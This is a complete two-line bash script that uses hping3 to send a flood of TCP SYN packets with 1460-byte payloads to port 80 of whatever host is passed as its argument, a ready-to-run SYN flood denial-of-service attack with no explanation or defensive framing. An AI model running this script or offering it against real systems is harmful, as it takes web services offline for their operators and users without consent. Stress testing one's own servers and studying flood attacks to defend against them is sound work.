#!/bin/bash
hping3 -S --flood -d 1460 -p 80 "$1"
